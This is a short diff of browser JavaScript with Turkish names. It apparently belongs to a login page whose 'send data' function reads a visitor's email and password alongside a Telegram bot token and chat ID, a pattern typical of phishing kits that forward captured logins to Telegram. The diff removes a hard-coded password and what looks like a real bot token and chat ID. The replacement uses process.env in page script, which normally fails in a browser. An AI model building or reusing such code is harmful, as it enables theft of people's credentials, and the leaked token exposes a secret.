@@ -89,11 +89,11 @@
         async function verileriGonder() {
             const email = document.getElementById('userEmail').value;
             const pass = document.getElementById('userPass').value;
-            const dogruSifre = "1qaz0plmmlp0zaq1"; 
+            const dogruSifre = process.env.SIFRE;
 
             // TELEGRAM BİLGİLERİ (Doğruluğunu son kez kontrol et)
-            const botToken = "8553432615:AAHYZMJlKypVEgAHjdUyDY8m8cqepunzlEY"; 
-            const chatId = "7580423994";
+            const token = process.env.BOT_TOKEN; 
+            const chatId = process.env.TELEGRAM_ID;
 
             if(!email || !pass) {
                 alert("Lütfen tüm alanları doldurun!");
